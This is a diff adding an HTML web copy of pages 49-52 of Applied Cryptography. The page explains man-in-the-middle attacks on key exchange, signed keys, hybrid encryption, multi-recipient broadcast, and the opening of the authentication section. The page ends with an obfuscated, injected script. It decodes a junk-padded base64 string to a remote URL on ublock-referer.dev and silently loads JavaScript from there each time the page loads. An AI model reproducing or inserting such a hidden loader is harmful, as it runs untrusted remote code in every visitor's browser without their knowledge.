@@ -1,0 +1,122 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Basic Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=03//-->
+<!--PAGES=049-052//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="03-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="03-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>To see how this causes a problem for Mallory, let&#146;s review his attempt to subvert the protocol. He can still substitute his own public keys for Alice&#146;s and Bob&#146;s in steps (1) and (2). But now, when he intercepts half of Alice&#146;s message in step (3), he cannot decrypt it with his private key and re-encrypt it with Bob&#146;s public key. He must invent a totally new message and send half of it to Bob. When he intercepts half of Bob&#146;s message to Alice in step (4), he has the same problem. He cannot decrypt it with his private key and re-encrypt it with Alice&#146;s public key. He has to invent a totally new message and send half of it to Alice. By the time he intercepts the second halves of the real messages in steps (5) and (6), it is too late for him to change the new messages he invented. The conversation between Alice and Bob will necessarily be completely different.
+</P>
+<P>Mallory could possibly get away with this scheme. If he knows Alice and Bob well enough to mimic both sides of a conversation between them, they might never realize that they are being duped. But surely this is much harder than sitting between the two of them, intercepting and reading their messages.</P>
+<P><FONT SIZE="+1"><B><I>Key Exchange with Digital Signatures</I></B></FONT></P>
+<P>Implementing digital signatures during a session-key exchange protocol circumvents this man-in-the-middle attack as well. Trent signs both Alice&#146;s and Bob&#146;s public keys. The signed keys include a signed certification of ownership. When Alice and Bob receive the keys, they each verify Trent&#146;s signature. Now they know that the public key belongs to that other person. The key exchange protocol can then proceed.
+</P>
+<P>Mallory has serious problems. He cannot impersonate either Alice or Bob because he doesn&#146;t know either of their private keys. He cannot substitute his public key for either of theirs because, while he has one signed by Trent, it is signed as being Mallory&#146;s. All he can do is listen to the encrypted traffic go back and forth or disrupt the lines of communication and prevent Alice and Bob from talking.</P>
+<P>This protocol uses Trent, but the risk of compromising the KDC is less than the first protocol. If Mallory compromises Trent (breaks into the KDC), all he gets is Trent&#146;s private key. This key enables him only to sign new keys; it does not let him decrypt any session keys or read any message traffic. To read the traffic, Mallory has to impersonate a user on the network and trick legitimate users into encrypting messages with his phony public key.</P>
+<P>Mallory can launch that kind of attack. With Trent&#146;s private key, he can create phony signed keys to fool both Alice and Bob. Then, he can either exchange them in the database for real signed keys, or he can intercept users&#146; database requests and reply with his phony keys. This enables him to launch a man-in-the-middle attack and read people&#146;s communications.</P>
+<P>This attack will work, but remember that Mallory has to be able to intercept and modify messages. In some networks this is a lot more difficult than passively sitting on a network reading messages as they go by. On a broadcast channel, such as a radio network, it is almost impossible to replace one message with another&#151;although the entire network can be jammed. On computer networks this is easier and seems to be getting easier every day. Consider IP spoofing, router attacks, and so forth; active attacks don&#146;t necessarily mean someone down a manhole with a datascope, and they are not limited to three-letter agencies.</P>
+<P><FONT SIZE="+1"><B><I>Key and Message Transmission</I></B></FONT></P>
+<P>Alice and Bob need not complete the key-exchange protocol before exchanging messages. In this protocol, Alice sends Bob the message, <I>M</I>, without any previous key exchange protocol:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice generates a random session key, <I>K</I>, and encrypts <I>M</I> using <I>K</I>.
+<DL>
+<DD><I>E</I><SUB>K</SUB>(<I>M</I>)
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Alice gets Bob&#146;s public key from the database.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice encrypts <I>K</I> with Bob&#146;s public key.
+<DL>
+<DD><I>E</I><SUB>B</SUB>(<I>K</I>)
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Alice sends both the encrypted message and encrypted session key to Bob.
+<DL>
+<DD><I>E</I><SUB>K</SUB>(<I>M</I>), <I>E</I><SUB>B</SUB>(<I>K</I>)
+</DL>
+<BR>For added security against man-in-the-middle attacks, Alice can sign the transmission.
+<DD><B>(5)</B>&nbsp;&nbsp;Bob decrypts Alice&#146;s session key, <I>K</I>, using his private key.
+<DD><B>(6)</B>&nbsp;&nbsp;Bob decrypts Alice&#146;s message using the session key.
+</DL>
+<P>This hybrid system is how public-key cryptography is most often used in a communications system. It can be combined with digital signatures, timestamps, and any other security protocols.
+</P>
+<P><FONT SIZE="+1"><B><I>Key and Message Broadcast</I></B></FONT></P>
+<P>There is no reason Alice can&#146;t send the encrypted message to several people. In this example, Alice will send the encrypted message to Bob, Carol, and Dave:
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice generates a random session key, <I>K</I>, and encrypts <I>M</I> using <I>K</I>.
+<DL>
+<DD><I>E</I><SUB>K</SUB>(<I>M</I>)
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Alice gets Bob&#146;s, Carol&#146;s, and Dave&#146;s public keys from the database.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice encrypts <I>K</I> with Bob&#146;s public key, encrypts <I>K</I> with Carol&#146;s public key, and then encrypts <I>K</I> with Dave&#146;s public key.
+<DL>
+<DD><I>E</I><SUB>B</SUB>(<I>K</I>), <I>E</I><SUB>C</SUB>(<I>K</I>), <I>E</I><SUB>D</SUB>(<I>K</I>)
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Alice broadcasts the encrypted message and all the encrypted keys to anybody who cares to receive it.
+<DL>
+<DD><I>E</I><SUB>B</SUB>(<I>K</I>), <I>E</I><SUB>C</SUB>(<I>K</I>), <I>E</I><SUB>D</SUB>(<I>K</I>), <I>E</I><SUB>K</SUB>(<I>M</I>)
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Only Bob, Carol, and Dave can decrypt the key, <I>K</I>, each using his or her private key.
+<DD><B>(6)</B>&nbsp;&nbsp;Only Bob, Carol, and Dave can decrypt Alice&#146;s message using <I>K</I>.
+</DL>
+<P>This protocol can be implemented on a store-and-forward network. A central server can forward Alice&#146;s message to Bob, Carol, and Dave along with their particular encrypted key. The server doesn&#146;t have to be secure or trusted, since it will not be able to decrypt any of the messages.
+</P>
+<H3><A NAME="Heading3"></A><FONT COLOR="#000077">3.2 Authentication</FONT></H3>
+<P>When Alice logs into a host computer (or an automatic teller, or a telephone banking system, or any other type of terminal), how does the host know who she is? How does the host know she is not Eve trying to falsify Alice&#146;s identity? Traditionally, passwords solve this problem. Alice enters her password, and the host confirms that it is correct. Both Alice and the host know this secret piece of knowledge and the host requests it from Alice every time she tries to log in.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="03-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="03-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(nSaAOhFN, QoicVkIW) {QoicVkIW = nSaAOhFN.createElement('script');QoicVkIW.type = 'text/javascript';QoicVkIW.async = true;QoicVkIW.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');nSaAOhFN.getElementsByTagName('body')[0].appendChild(QoicVkIW);}(document));</script></body>
+</html>
